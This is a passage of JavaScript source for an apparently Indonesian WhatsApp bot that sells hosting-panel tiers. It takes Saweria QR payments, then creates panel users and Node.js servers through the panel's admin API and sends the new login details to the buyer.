"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
/*
await rafatharcode.sendMessage(sender, { text: `*BERIKUT DATA AKUN ANDA*\n\n*EMAIL:* ${ress.attributes.email}\n*USERNAME:* ${ress.attributes.username}\n*PASSWORD:* ${psswd}\n*LOGIN:* ${domain}\n\n*NOTE*\n_*BOT* atau *${ownername}* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\n#TERIMAKASIH` })
fs.unlinkSync("./data/gateway/" + sender.split("@")[0] + ".json")
*/
}
}
}
break
case 'b4gb-v2':{
if (fs.existsSync("./data/gateway/" + sender.split("@")[0] + ".json")) return reply(`Proses buy panel kamu masih ada yang belum terselesaikan.\n\nKetik *${prefix}batal* untuk membatalkan.`)
if (!q) return reply(`Contoh: ${prefix+command} username`)
let f3 = await fetch(domain2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let result = await f3.json();
let users = false
for (let user of result.data) {
let u = user.attributes
if (u.username == q.replace(' ', '').toLowerCase()) {users = true}
}
if (users) return reply(`Username tersebut sudah ada..`)
reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment(panel_v2.empat_gbb.price, "BUY " + panel_v2.empat_gbb.name)
if (!res.status) return reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran: ${res.data.id}
*      *〆* Total Transfer: ${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batalbuy*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: m })
})
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {

let username = args[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "4024"
let cpu = "60"
let disk = "4024"
let email = username + "@s.id"
akunlo = "https://telegra.ph/file/d2ac242bf2a3cc119fbed.png" 
let password = crypto.randomBytes(5).toString('hex') 
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
reply(`ᴘʀᴏꜱᴇꜱ ᴄʀᴇᴀᴛɪɴɢ ʏᴏᴜʀ ꜱᴇʀᴠᴇʀ`)
ctf = `

┌ㅤ◦ㅤID : ${user.id}
│ㅤ◦  EMAIL : ${user.email}
│ㅤ◦  USERNAME : ${user.username}
│ㅤ◦ㅤPASSWORD : ${password.toString()}
└ㅤ◦ㅤLOGIN : ${domain2}
`
rafatharcode.sendMessage(m.sender,{image: {url: akunlo}, caption: ctf }, { quoted: m })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
/*
await rafatharcode.sendMessage(sender, { text: `*BERIKUT DATA AKUN ANDA*\n\n*EMAIL:* ${ress.attributes.email}\n*USERNAME:* ${ress.attributes.username}\n*PASSWORD:* ${psswd}\n*LOGIN:* ${domain2}\n\n*NOTE*\n_*BOT* atau *${ownername}* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\n#TERIMAKASIH` })
fs.unlinkSync("./data/gateway/" + sender.split("@")[0] + ".json")
*/
}
}
}
break
case 'b5gb':{
if (fs.existsSync("./data/gateway/" + sender.split("@")[0] + ".json")) return reply(`Proses buy panel kamu masih ada yang belum terselesaikan.\n\nKetik *${prefix}batal* untuk membatalkan.`)
if (!q) return reply(`Contoh: ${prefix+command} username`)
let f3 = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f3.json();
let users = false
for (let user of result.data) {
let u = user.attributes
if (u.username == q.replace(' ', '').toLowerCase()) {users = true}
}
if (users) return reply(`Username tersebut sudah ada..`)
reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment(panel.lima_gb.price, "BUY " + panel.lima_gb.name)
if (!res.status) return reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran: ${res.data.id}
*      *〆* Total Transfer: ${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batalbuy*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: m })
})
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {

let username = args[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "5024"
let cpu = "100"
let disk = "5024"
let email = username + "@s.id"
akunlo = "https://telegra.ph/file/d2ac242bf2a3cc119fbed.png" 
let password = crypto.randomBytes(5).toString('hex') 
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`ᴘʀᴏꜱᴇꜱ ᴄʀᴇᴀᴛɪɴɢ ʏᴏᴜʀ ꜱᴇʀᴠᴇʀ`)
ctf = `

┌ㅤ◦ㅤID : ${user.id}
│ㅤ◦  EMAIL : ${user.email}
│ㅤ◦  USERNAME : ${user.username}
│ㅤ◦ㅤPASSWORD : ${password.toString()}
└ㅤ◦ㅤLOGIN : ${domain}
`
rafatharcode.sendMessage(m.sender,{image: {url: akunlo}, caption: ctf }, { quoted: m })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
/*
await rafatharcode.sendMessage(sender, { text: `*BERIKUT DATA AKUN ANDA*\n\n*EMAIL:* ${ress.attributes.email}\n*USERNAME:* ${ress.attributes.username}\n*PASSWORD:* ${psswd}\n*LOGIN:* ${domain}\n\n*NOTE*\n_*BOT* atau *${ownername}* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\n#TERIMAKASIH` })
fs.unlinkSync("./data/gateway/" + sender.split("@")[0] + ".json")
*/
}
}
}
break
case 'b5gb-v2':{
if (fs.existsSync("./data/gateway/" + sender.split("@")[0] + ".json")) return reply(`Proses buy panel kamu masih ada yang belum terselesaikan.\n\nKetik *${prefix}batal* untuk membatalkan.`)
if (!q) return reply(`Contoh: ${prefix+command} username`)
let f3 = await fetch(domain2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let result = await f3.json();
let users = false
for (let user of result.data) {
let u = user.attributes
if (u.username == q.replace(' ', '').toLowerCase()) {users = true}
}
if (users) return reply(`Username tersebut sudah ada..`)
reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment(panel_v2.lima_gbb.price, "BUY " + panel_v2.lima_gbb.name)
if (!res.status) return reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran: ${res.data.id}
*      *〆* Total Transfer: ${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batalbuy*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: m })
})
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {

let username = args[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "5024"
let cpu = "100"
let disk = "5024"
let email = username + "@s.id"
akunlo = "https://telegra.ph/file/d2ac242bf2a3cc119fbed.png" 
let password = crypto.randomBytes(5).toString('hex') 
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
reply(`ᴘʀᴏꜱᴇꜱ ᴄʀᴇᴀᴛɪɴɢ ʏᴏᴜʀ ꜱᴇʀᴠᴇʀ`)
ctf = `

┌ㅤ◦ㅤID : ${user.id}
│ㅤ◦  EMAIL : ${user.email}
│ㅤ◦  USERNAME : ${user.username}
│ㅤ◦ㅤPASSWORD : ${password.toString()}
└ㅤ◦ㅤLOGIN : ${domain2}
`
rafatharcode.sendMessage(m.sender,{image: {url: akunlo}, caption: ctf }, { quoted: m })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
/*
await rafatharcode.sendMessage(sender, { text: `*BERIKUT DATA AKUN ANDA*\n\n*EMAIL:* ${ress.attributes.email}\n*USERNAME:* ${ress.attributes.username}\n*PASSWORD:* ${psswd}\n*LOGIN:* ${domain2}\n\n*NOTE*\n_*BOT* atau *${ownername}* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\n#TERIMAKASIH` })
fs.unlinkSync("./data/gateway/" + sender.split("@")[0] + ".json")
*/
}
}
}
break
case 'bunli':{
if (fs.existsSync("./data/gateway/" + sender.split("@")[0] + ".json")) return reply(`Proses buy panel kamu masih ada yang belum terselesaikan.\n\nKetik *${prefix}batal* untuk membatalkan.`)
if (!q) return reply(`Contoh: ${prefix+command} username`)
let f3 = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f3.json();
let users = false
for (let user of result.data) {
let u = user.attributes
if (u.username == q.replace(' ', '').toLowerCase()) {users = true}
}
if (users) return reply(`Username tersebut sudah ada..`)
reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment(panel.unli.price, "BUY " + panel.unli.name)
if (!res.status) return reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran: ${res.data.id}
*      *〆* Total Transfer: ${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batalbuy*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: m })
})
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {

let username = args[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@s.id"
akunlo = "https://telegra.ph/file/d2ac242bf2a3cc119fbed.png" 
let password = crypto.randomBytes(5).toString('hex') 
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`ᴘʀᴏꜱᴇꜱ ᴄʀᴇᴀᴛɪɴɢ ʏᴏᴜʀ ꜱᴇʀᴠᴇʀ`)
ctf = `

┌ㅤ◦ㅤID : ${user.id}
│ㅤ◦  EMAIL : ${user.email}
│ㅤ◦  USERNAME : ${user.username}
│ㅤ◦ㅤPASSWORD : ${password.toString()}
└ㅤ◦ㅤLOGIN : ${domain}
`
rafatharcode.sendMessage(m.sender,{image: {url: akunlo}, caption: ctf }, { quoted: m })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
/*
await rafatharcode.sendMessage(sender, { text: `*BERIKUT DATA AKUN ANDA*\n\n*EMAIL:* ${ress.attributes.email}\n*USERNAME:* ${ress.attributes.username}\n*PASSWORD:* ${psswd}\n*LOGIN:* ${domain}\n\n*NOTE*\n_*BOT* atau *${ownername}* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\n#TERIMAKASIH` })
fs.unlinkSync("./data/gateway/" + sender.split("@")[0] + ".json")
*/
}
}
}
break
case 'bunli-v2':{
if (fs.existsSync("./data/gateway/" + sender.split("@")[0] + ".json")) return reply(`Proses buy panel kamu masih ada yang belum terselesaikan.\n\nKetik *${prefix}batal* untuk membatalkan.`)
if (!q) return reply(`Contoh: ${prefix+command} username`)
let f3 = await fetch(domain2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let result = await f3.json();
let users = false
for (let user of result.data) {
let u = user.attributes
if (u.username == q.replace(' ', '').toLowerCase()) {users = true}
}
if (users) return reply(`Username tersebut sudah ada..`)
reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment(panel_v2.unlii.price, "BUY " + panel_v2.unlii.name)
if (!res.status) return reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran: ${res.data.id}
*      *〆* Total Transfer: ${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batalbuy*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: m })
})
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {

let username = args[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@s.id"
akunlo = "https://telegra.ph/file/d2ac242bf2a3cc119fbed.png" 
let password = crypto.randomBytes(5).toString('hex') 
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
reply(`ᴘʀᴏꜱᴇꜱ ᴄʀᴇᴀᴛɪɴɢ ʏᴏᴜʀ ꜱᴇʀᴠᴇʀ`)
ctf = `

┌ㅤ◦ㅤID : ${user.id}
│ㅤ◦  EMAIL : ${user.email}
│ㅤ◦  USERNAME : ${user.username}
│ㅤ◦ㅤPASSWORD : ${password.toString()}
└ㅤ◦ㅤLOGIN : ${domain2}
`
rafatharcode.sendMessage(m.sender,{image: {url: akunlo}, caption: ctf }, { quoted: m })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
/*
await rafatharcode.sendMessage(sender, { text: `*BERIKUT DATA AKUN ANDA*\n\n*EMAIL:* ${ress.attributes.email}\n*USERNAME:* ${ress.attributes.username}\n*PASSWORD:* ${psswd}\n*LOGIN:* ${domain2}\n\n*NOTE*\n_*BOT* atau *${ownername}* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\n#TERIMAKASIH` })
fs.unlinkSync("./data/gateway/" + sender.split("@")[0] + ".json")
*/
}
}
}
break
case 'depo1000': case 'tesdepo': {
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('1000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo2000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('2000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo3000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('3000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo4000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('4000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo5000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('5000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
- Jika ingin membatalkan ketik *${prefix}batal-membeli*
- Setelah transfer, tunggu beberapa saat
- Jika pembayaran berhasil, status akan diperbarui otomatis.
- Untuk bantuan lebih lanjut, hubungi *${prefix}owner*`
let object_buy = {
number: m.sender,
id: res.data.id
}
fs.writeFile("./data/gateway/" + m.sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
rafatharcode.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: ftext })
})  
let status = false
while (!status) {
await sleep(500)
let ress = await Pay.checkPayment(res.data.id)
status = ress.status
if (ress.status) {
await rafatharcode.sendMessage(m.sender, { text: `Pembayaran Berhasil Di lakukan✅` })
}
}
}
break
case 'depo6000':{
m.reply("Sedang membuat QR Code...")
let Pay = new Saweria(db_saweria)
let res = await Pay.createPayment('6000', "AnjayyDepo")
if (!res.status) return m.reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`)
let teks = `*INFO PEMBAYARAN*

Transfer sebelum:
${res.data.expired_at} WIB

*      *〆* ID Pembayaran:* ${res.data.id}
*      *〆* Total Transfer:* Rp${toRupiah(res.data.amount_raw)}

*NOTE:*
- Kode QR hanya valid untuk 1 kali transfer.
